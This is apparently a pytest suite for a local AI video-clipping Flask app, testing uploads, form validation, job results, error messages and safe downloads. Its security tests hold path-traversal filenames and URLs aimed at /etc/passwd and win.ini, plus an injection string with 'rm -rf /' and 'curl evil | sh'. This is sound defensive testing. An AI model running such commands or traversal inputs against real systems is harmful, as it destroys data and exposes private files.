from __future__ import annotations

import io
import subprocess
from collections.abc import Callable
from pathlib import Path
from typing import Any

import pytest
from flask import Flask
from flask.testing import FlaskClient

from app.ai.exceptions import OllamaModelUnavailableError, OllamaUnavailableError
from app.clipping import (
    AnalysisStageError,
    ClipGenerationResult,
    ClipJobRequest,
    ClipRenderError,
    GeneratedClip,
    InsufficientCandidatesError,
    InvalidJobRequestError,
    JobStatus,
    OutputVerificationError,
    SourceTooShortError,
    TranscriptionStageError,
)
from app.ui import UIConfig, create_app
from app.ui.__main__ import LOCAL_HOSTS
from app.ui.app import _remove_stale_uploads, timecode
from app.ui.config import DEFAULT_HOST
from app.ui.jobs import Job, friendly_error, is_job_id
from app.video import FFprobeNotFoundError, InvalidVideoError, VideoInfo

JOB_A = "0" * 32


def video_info(path: Path) -> VideoInfo:
    return VideoInfo(str(path), "mov,mp4", 120.0, 640, 360, 30.0, "h264", "aac", True, True)


class FakeService:
    """Stands in for M05: records the request and writes real clip files, or raises."""

    def __init__(self, error: Exception | None = None, before: Callable[[], object] | None = None) -> None:
        self.error = error
        self.before = before
        self.requests: list[ClipJobRequest] = []
        self.on_status: Callable[[JobStatus, str], None] | None = None

    def factory(self, on_status: Callable[[JobStatus, str], None]) -> FakeService:
        self.on_status = on_status
        return self

    def generate(self, request: ClipJobRequest) -> ClipGenerationResult:
        self.requests.append(request)
        assert self.on_status
        self.on_status(JobStatus.TRANSCRIBING, "source.mp4")
        if self.before:
            self.before()
        out = Path(request.output_dir)
        out.mkdir(parents=True)
        if self.error:
            raise self.error
        clips = []
        for i in range(1, request.clip_count + 1):
            path = out / f"clip_{i:03d}.mp4"
            path.write_bytes(b"fake mp4 " * 10)
            start = 84.0 + 20 * i
            clips.append(GeneratedClip(
                index=i, path=str(path), start=start, end=start + request.clip_duration,
                duration=request.clip_duration, actual_duration=request.clip_duration, score=0.91,
                reason=f"<b>reason {i}</b>", title=f"title {i}", candidate_start=start, candidate_end=start + 5,
            ))
        self.on_status(JobStatus.COMPLETED, f"done in {out}")
        return ClipGenerationResult(
            input_path=request.input_path, output_dir=str(out), instruction=request.instruction,
            requested_count=request.clip_count, requested_duration=request.clip_duration, clips=tuple(clips),
            candidates_returned=8, candidates_valid=8, model_name="qwen2.5:0.5b",
        )


@pytest.fixture()
def config(tmp_path: Path) -> UIConfig:
    return UIConfig(upload_dir=tmp_path / "uploads", output_dir=tmp_path / "outputs", max_upload_mb=1)


def make_app(config: UIConfig, service: FakeService | None = None, probe: Any = video_info) -> Flask:
    service = service or FakeService()
    app = create_app(config, service_factory=service.factory, probe=probe)
    app.config["TESTING"] = True
    return app


@pytest.fixture()
def service() -> FakeService:
    return FakeService()


@pytest.fixture()
def client(config: UIConfig, service: FakeService) -> FlaskClient:
    return make_app(config, service).test_client()


def form(filename: str | None = "talk.mp4", data: bytes = b"video bytes", **fields: Any) -> dict[str, Any]:
    values: dict[str, Any] = {"clip_count": "2", "clip_duration": "10", "instruction": "funny moments"}
    values.update(fields)
    if filename is not None:
        values["video"] = (io.BytesIO(data), filename)
    return values


def submit(client: FlaskClient, **kwargs: Any) -> Any:
    return client.post("/jobs", data=form(**kwargs), content_type="multipart/form-data")


def wait_for_job(client: FlaskClient, response: Any) -> Job:
    assert response.status_code == 303, response.get_data(as_text=True)
    job_id = response.headers["Location"].rsplit("/", 1)[-1]
    job: Job | None = client.application.extensions["clipper"].jobs.get(job_id)
    assert job is not None and job.thread is not None
    job.thread.join(5)
    assert job.done
    return job


def run_ok(client: FlaskClient, **kwargs: Any) -> Job:
    job = wait_for_job(client, submit(client, **kwargs))
    assert job.status is JobStatus.COMPLETED
    return job


def dir_entries(path: Path) -> list[Path]:
    return list(path.iterdir()) if path.exists() else []


# --- app factory, configuration --------------------------------------------------------


def test_app_factory_returns_independent_apps(config: UIConfig) -> None:
    a, b = make_app(config), make_app(config)
    assert isinstance(a, Flask) and a is not b
    assert a.extensions["clipper"].jobs is not b.extensions["clipper"].jobs


def test_upload_limit_configured(config: UIConfig) -> None:
    assert make_app(config).config["MAX_CONTENT_LENGTH"] == 1024 * 1024


def test_safe_local_binding_defaults(monkeypatch: pytest.MonkeyPatch) -> None:
    for var in ("CLIPPER_HOST", "CLIPPER_PORT", "CLIPPER_DEBUG", "CLIPPER_MAX_UPLOAD_MB"):
        monkeypatch.delenv(var, raising=False)
    cfg = UIConfig.from_env()
    assert cfg.host == DEFAULT_HOST == "127.0.0.1"
    assert cfg.host in LOCAL_HOSTS and "0.0.0.0" not in LOCAL_HOSTS
    assert UIConfig().host == "127.0.0.1"
    assert cfg.max_upload_mb > 0


def test_debug_disabled_by_default(monkeypatch: pytest.MonkeyPatch, config: UIConfig) -> None:
    monkeypatch.delenv("CLIPPER_DEBUG", raising=False)
    assert UIConfig.from_env().debug is False
    assert make_app(config).debug is False


def test_env_overrides(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    monkeypatch.setenv("CLIPPER_HOST", "localhost")
    monkeypatch.setenv("CLIPPER_PORT", "8123")
    monkeypatch.setenv("CLIPPER_DEBUG", "true")
    monkeypatch.setenv("CLIPPER_MAX_UPLOAD_MB", "50")
    monkeypatch.setenv("CLIPPER_OUTPUT_DIR", str(tmp_path / "o"))
    cfg = UIConfig.from_env()
    assert (cfg.host, cfg.port, cfg.debug, cfg.max_upload_mb, cfg.output_dir) == (
        "localhost", 8123, True, 50, tmp_path / "o"
    )


# --- home page --------------------------------------------------------------------------


def test_home_page_renders_form(client: FlaskClient) -> None:
    html = client.get("/").get_data(as_text=True)
    assert "Local AI Video Clipper" in html
    for field in ('name="video"', 'name="clip_count"', 'name="clip_duration"', 'name="instruction"'):
        assert field in html
    for label in ('for="video"', 'for="clip_count"', 'for="clip_duration"', 'for="instruction"'):
        assert label in html
    assert 'enctype="multipart/form-data"' in html
    assert "Generate Clips" in html
    assert "MP4" in html and "WEBM" in html


def test_home_page_get_status(client: FlaskClient) -> None:
    assert client.get("/").status_code == 200


def test_static_css_served(client: FlaskClient) -> None:
    assert client.get("/static/style.css").status_code == 200


# --- upload validation ------------------------------------------------------------------


def test_missing_upload(client: FlaskClient, service: FakeService) -> None:
    r = submit(client, filename=None)
    assert r.status_code == 400
    assert "Please choose a video file" in r.get_data(as_text=True)
    assert not service.requests


def test_empty_filename(client: FlaskClient, service: FakeService) -> None:
    r = submit(client, filename="")
    assert r.status_code == 400
    assert "Please choose a video file" in r.get_data(as_text=True)
    assert not service.requests


@pytest.mark.parametrize("name", ["notes.txt", "video.exe", "video", "clip.mp4.sh", "x.gif"])
def test_unsupported_extension(client: FlaskClient, config: UIConfig, service: FakeService, name: str) -> None:
    r = submit(client, filename=name)
    assert r.status_code == 400
    assert "Unsupported file type" in r.get_data(as_text=True)
    assert not service.requests
    assert dir_entries(config.upload_dir) == []


def test_empty_file_rejected(client: FlaskClient, config: UIConfig, service: FakeService) -> None:
    r = submit(client, data=b"")
    assert r.status_code == 400
    assert "empty" in r.get_data(as_text=True)
    assert dir_entries(config.upload_dir) == []
    assert not service.requests


def test_malformed_video_rejected_by_probe(config: UIConfig, service: FakeService) -> None:
    def bad_probe(path: Path) -> VideoInfo:
        raise InvalidVideoError(str(path), "corrupt")

    client = make_app(config, service, probe=bad_probe).test_client()
    r = submit(client)
    html = r.get_data(as_text=True)
    assert r.status_code == 400
    assert "could not be read as a supported video" in html
    assert str(config.upload_dir) not in html
    assert dir_entries(config.upload_dir) == []
    assert not service.requests


def test_missing_ffprobe_message(config: UIConfig) -> None:
    def no_probe(path: Path) -> VideoInfo:
        raise FFprobeNotFoundError()

    r = submit(make_app(config, probe=no_probe).test_client())
    assert "FFmpeg is not installed" in r.get_data(as_text=True)


def test_oversized_upload(client: FlaskClient, config: UIConfig, service: FakeService) -> None:
    r = submit(client, data=b"x" * (1024 * 1024 + 10))
    assert r.status_code == 413
    assert "1 MB limit" in r.get_data(as_text=True)
    assert not service.requests
    assert dir_entries(config.upload_dir) == []


@pytest.mark.parametrize(
    "name", ["../../evil.mp4", "..\\..\\evil.mp4", "C:\\Windows\\evil.mp4", "/etc/evil.mp4", "a/../../b.mkv"]
)
def test_path_traversal_filename(
    client: FlaskClient, service: FakeService, config: UIConfig, tmp_path: Path, name: str
) -> None:
    job = run_ok(client, filename=name)
    source = Path(service.requests[-1].input_path)
    assert source.parent == config.upload_dir.resolve() / job.id
    assert source.name in ("source.mp4", "source.mkv")
    assert "/" not in job.original_name and "\\" not in job.original_name
    assert not (tmp_path / "evil.mp4").exists() and not (tmp_path.parent / "evil.mp4").exists()


# --- form validation --------------------------------------------------------------------


@pytest.mark.parametrize("count", ["0", "-1", "21", "abc", "2.5", ""])
def test_invalid_clip_count(client: FlaskClient, service: FakeService, config: UIConfig, count: str) -> None:
    r = submit(client, clip_count=count)
    assert r.status_code == 400
    assert 'class="error"' in r.get_data(as_text=True)
    assert not service.requests
    assert dir_entries(config.upload_dir) == []


@pytest.mark.parametrize("duration", ["0", "0.5", "601", "-5", "nan", "inf", "ten", ""])
def test_invalid_duration(client: FlaskClient, service: FakeService, duration: str) -> None:
    r = submit(client, clip_duration=duration)
    assert r.status_code == 400
    assert 'class="error"' in r.get_data(as_text=True)
    assert not service.requests


def test_invalid_instruction_too_long(client: FlaskClient, service: FakeService) -> None:
    r = submit(client, instruction="x" * 501)
    assert r.status_code == 400
    assert "at most 500 characters" in r.get_data(as_text=True)
    assert not service.requests


def test_blank_instruction_uses_default(client: FlaskClient, service: FakeService) -> None:
    run_ok(client, instruction="   ")
    assert service.requests[0].instruction == "interesting moments"


def test_form_values_kept_after_error(client: FlaskClient) -> None:
    html = submit(client, clip_count="99", instruction="cats").get_data(as_text=True)
    assert 'value="99"' in html and 'value="cats"' in html


# --- generation -------------------------------------------------------------------------


def test_valid_upload_builds_m05_request(client: FlaskClient, service: FakeService, config: UIConfig) -> None:
    job = run_ok(client, filename="My Talk.MKV", clip_count="5", clip_duration="30", instruction="funny moments")
    (req,) = service.requests
    assert (req.clip_count, req.clip_duration, req.instruction) == (5, 30.0, "funny moments")
    assert Path(req.output_dir) == config.output_dir.resolve() / job.id
    assert Path(req.input_path).name == "source.mkv"
    assert job.original_name == "My Talk.MKV"


def test_m05_success_redirects_to_result(client: FlaskClient) -> None:
    r = submit(client)
    assert r.status_code == 303 and r.headers["Location"].startswith("/jobs/")
    job = wait_for_job(client, r)
    html = client.get(f"/jobs/{job.id}").get_data(as_text=True)
    assert "2 clips ready" in html


def test_upload_deleted_after_success(client: FlaskClient, config: UIConfig) -> None:
    run_ok(client)
    assert dir_entries(config.upload_dir) == []


def test_result_page_metadata(client: FlaskClient) -> None:
    job = run_ok(client, filename="talk.mp4", clip_count="2", clip_duration="10", instruction="funny moments")
    html = client.get(f"/jobs/{job.id}").get_data(as_text=True)
    assert "talk.mp4" in html and "funny moments" in html
    assert "Requested clips</dt><dd>2" in html
    assert "10.000 sec" in html
    assert "Clip 1" in html and "Clip 2" in html
    assert "00:01:44.000" in html and "00:01:54.000" in html  # clip 1: 104 s -> 114 s
    assert "Score: 0.91" in html
    assert "&lt;b&gt;reason 1&lt;/b&gt;" in html and "<b>reason" not in html  # AI text is escaped
    assert f"/jobs/{job.id}/clips/clip_001.mp4" in html
    assert f"/jobs/{job.id}/clips/clip_002.mp4" in html


def test_result_page_hides_internal_paths(client: FlaskClient, config: UIConfig) -> None:
    job = run_ok(client)
    html = client.get(f"/jobs/{job.id}").get_data(as_text=True)
    assert str(config.output_dir) not in html and str(config.upload_dir) not in html


def test_progress_page_shows_real_stage(config: UIConfig) -> None:
    import threading

    release = threading.Event()
    service = FakeService(before=lambda: release.wait(5))
    client = make_app(config, service).test_client()
    r = submit(client)
    job_id = r.headers["Location"].rsplit("/", 1)[-1]
    job = client.application.extensions["clipper"].jobs.get(job_id)
    for _ in range(100):
        if job.status is JobStatus.TRANSCRIBING:
            break
        threading.Event().wait(0.01)
    html = client.get(f"/jobs/{job_id}").get_data(as_text=True)
    assert 'http-equiv="refresh"' in html
    assert "Transcribing speech (Whisper) <span" in html
    assert "%" not in html  # no fabricated percentages
    busy = submit(client)
    assert busy.status_code == 409 and "Another job is still running" in busy.get_data(as_text=True)
    release.set()
    job.thread.join(5)
    assert "2 clips ready" in client.get(f"/jobs/{job_id}").get_data(as_text=True)
    assert dir_entries(config.upload_dir) == []


@pytest.mark.parametrize(
    ("error", "expected"),
    [
        (SourceTooShortError(8.0, 30.0), "shorter than the requested clip duration of 30 seconds"),
        (InsufficientCandidatesError(3, 5, 7), "Only 3 sufficiently distinct moments were found, but 5 were requested"),
        (TranscriptionStageError("transcription failed: C:\\secret\\path boom"), "Transcription failed"),
        (AnalysisStageError("x"), "local AI analysis failed"),
        (ClipRenderError(2, "ffmpeg -i C:\\secret\\in.mp4 exploded"), "Video processing failed while generating clip 2"),
        (OutputVerificationError(1, "duration"), "Video processing failed while generating clip 1"),
        (InvalidJobRequestError("source video has no audio track"), "no audio track"),
        (RuntimeError("Traceback C:\\secret"), "unexpected error"),
    ],
)
def test_m05_failures_show_friendly_error(
    config: UIConfig, tmp_path: Path, error: Exception, expected: str
) -> None:
    client = make_app(config, FakeService(error=error)).test_client()
    job = wait_for_job(client, submit(client))
    assert job.status is JobStatus.FAILED
    r = client.get(f"/jobs/{job.id}")
    html = r.get_data(as_text=True)
    assert expected in html
    assert "secret" not in html and "Traceback" not in html and str(tmp_path) not in html
    # cleanup on failed job: no upload and no output directory left
    assert dir_entries(config.upload_dir) == []
    assert dir_entries(config.output_dir) == []


def _cause(outer: Exception, inner: Exception) -> Exception:
    outer.__cause__ = inner
    return outer


def test_ollama_not_running_message() -> None:
    e = _cause(AnalysisStageError("AI analysis failed"), OllamaUnavailableError("http://localhost:11434"))
    assert friendly_error(e) == "Ollama is not running. Start Ollama and try again."


def test_qwen_model_unavailable_message() -> None:
    e = _cause(AnalysisStageError("AI analysis failed"), OllamaModelUnavailableError("qwen2.5:0.5b"))
    assert "Qwen model is unavailable" in friendly_error(e) and "ollama pull qwen2.5:0.5b" in friendly_error(e)


def test_unreadable_source_message() -> None:
    e = _cause(InvalidJobRequestError("cannot use source"), InvalidVideoError("C:\\x\\source.mp4", "bad"))
    assert "C:\\" not in friendly_error(e) and "could not be read" in friendly_error(e)


# --- downloads --------------------------------------------------------------------------


def test_download_valid_clip(client: FlaskClient) -> None:
    job = run_ok(client)
    r = client.get(f"/jobs/{job.id}/clips/clip_001.mp4")
    assert r.status_code == 200
    assert r.data == b"fake mp4 " * 10
    assert "attachment" in r.headers["Content-Disposition"] and "clip_001.mp4" in r.headers["Content-Disposition"]
    r.close()


def test_download_nonexistent_clip(client: FlaskClient) -> None:
    job = run_ok(client)  # 2 clips
    assert client.get(f"/jobs/{job.id}/clips/clip_003.mp4").status_code == 404
    assert client.get(f"/jobs/{JOB_A}/clips/clip_001.mp4").status_code == 404


def test_download_listed_but_deleted_file(client: FlaskClient, config: UIConfig) -> None:
    job = run_ok(client)
    (config.output_dir / job.id / "clip_001.mp4").unlink()
    assert client.get(f"/jobs/{job.id}/clips/clip_001.mp4").status_code == 404


@pytest.mark.parametrize(
    "path",
    [
        "/jobs/{id}/clips/..%2F..%2Fsecret.txt",
        "/jobs/{id}/clips/../../secret.txt",
        "/jobs/{id}/clips/..%5C..%5Csecret.txt",
        "/jobs/{id}/clips/C:%5CWindows%5Cwin.ini",
        "/jobs/{id}/clips/%2Fetc%2Fpasswd",
        "/jobs/{id}/clips/secret.txt",
        "/jobs/{id}/clips/clip_001.mp4%00.txt",
        "/download?path=C:%5CWindows%5Cwin.ini",
        "/jobs/..%2F..%2F/clips/clip_001.mp4",
    ],
)
def test_arbitrary_path_cannot_be_downloaded(client: FlaskClient, config: UIConfig, path: str) -> None:
    job = run_ok(client)
    (config.output_dir / "secret.txt").write_text("top secret")
    (config.output_dir / job.id / "secret.txt").write_text("top secret")
    r = client.get(path.format(id=job.id))
    assert r.status_code == 404
    assert b"top secret" not in r.data


@pytest.mark.parametrize("job_id", ["abc", "../x", "0" * 31, "G" * 32, "0" * 32 + "/", "00000000-0000-0000-0000-000000000000"])
def test_job_id_validation(client: FlaskClient, job_id: str) -> None:
    assert not is_job_id(job_id) or job_id == JOB_A
    assert client.get(f"/jobs/{job_id}").status_code == 404


def test_unknown_job_is_404(client: FlaskClient) -> None:
    r = client.get(f"/jobs/{JOB_A}")
    assert r.status_code == 404 and "does not exist" in r.get_data(as_text=True)


def test_output_path_traversal_through_job_result(client: FlaskClient, config: UIConfig) -> None:
    """Even if a result listed a file outside the job dir, only clip_NNN.mp4 inside it is served."""
    job = run_ok(client)
    assert job.result is not None
    evil = config.output_dir.parent / "clip_009.mp4"
    evil.write_bytes(b"outside")
    hacked = job.result.clips[0].__class__(**{**job.result.clips[0].to_dict(), "path": str(evil)})
    job.result = job.result.__class__(**{**job.result.__dict__, "clips": (hacked,)})
    r = client.get(f"/jobs/{job.id}/clips/clip_009.mp4")
    assert r.status_code == 404 and b"outside" not in r.data


def test_download_requires_completed_job(config: UIConfig) -> None:
    client = make_app(config, FakeService(error=InsufficientCandidatesError(1, 2, 2))).test_client()
    job = wait_for_job(client, submit(client))
    assert client.get(f"/jobs/{job.id}/clips/clip_001.mp4").status_code == 404


# --- cleanup, helpers, security -----------------------------------------------------------


def test_stale_uploads_removed_on_startup(config: UIConfig) -> None:
    stale = config.upload_dir / JOB_A
    stale.mkdir(parents=True)
    (stale / "source.mp4").write_bytes(b"x")
    keep = config.upload_dir / "my_video_folder"
    keep.mkdir()
    make_app(config)
    assert not stale.exists() and keep.exists()


def test_remove_stale_uploads_missing_dir(tmp_path: Path) -> None:
    _remove_stale_uploads(tmp_path / "nope")  # no error


def test_timecode() -> None:
    assert timecode(84.0) == "00:01:24.000"
    assert timecode(3725.5) == "01:02:05.500"
    assert timecode(0.0) == "00:00:00.000"


def test_no_subprocess_or_shell_in_ui(monkeypatch: pytest.MonkeyPatch, client: FlaskClient) -> None:
    def forbidden(*args: object, **kwargs: object) -> None:
        raise AssertionError("UI must not run subprocesses")

    monkeypatch.setattr(subprocess, "run", forbidden)
    monkeypatch.setattr(subprocess, "Popen", forbidden)
    job = run_ok(client, instruction="$(rm -rf /); del C:\\* & curl evil | sh")
    assert job.status is JobStatus.COMPLETED


def test_ui_source_has_no_pipeline_logic() -> None:
    ui = Path(__file__).resolve().parents[1] / "app" / "ui"
    source = "\n".join(p.read_text(encoding="utf-8") for p in ui.glob("*.py"))
    for forbidden in ("subprocess", "faster_whisper", "import ollama", "select_moments", "compute_window", "ffmpeg -"):
        assert forbidden not in source


def test_no_secret_key_or_credentials_in_templates() -> None:
    templates = Path(__file__).resolve().parents[1] / "app" / "ui" / "templates"
    html = "\n".join(p.read_text(encoding="utf-8") for p in templates.glob("*.html")).lower()
    for word in ("secret", "password", "api_key", "token", "http://", "https://"):
        assert word not in html
